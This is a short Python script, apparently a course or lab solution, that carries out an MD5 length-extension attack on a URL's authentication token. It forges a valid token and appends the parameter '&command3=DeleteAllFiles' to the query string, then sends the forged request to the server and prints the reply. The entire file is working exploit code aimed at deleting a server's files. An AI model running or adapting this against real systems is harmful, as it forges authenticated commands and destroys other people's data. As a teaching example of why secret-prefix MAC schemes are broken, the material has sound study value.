import httplib, urlparse, sys, urllib
url = sys.argv[1]

from pymd5 import md5, padding

# split around equal and ampersand to get token
token = url.split('=')[1].split('&')[0]

# split ampersand and generate message
params = url.split('&')

# generate original message
message = params[1] + "&" + params[2] + "&" + params[3]


m_len = 8 + len(message)
bits = (m_len + len(padding(m_len*8)))*8

h = md5(state=token.decode("hex"), count=bits)
killamessage = "&command3=DeleteAllFiles"
h.update(killamessage)
killatoken = h.hexdigest()


killaurl = url.split('=')[0] + "=" + killatoken + "&" + message + urllib.quote(padding(m_len*8)) + killamessage
parsedUrl = urlparse.urlparse(killaurl)
conn = httplib.HTTPConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)

print conn.getresponse().read()
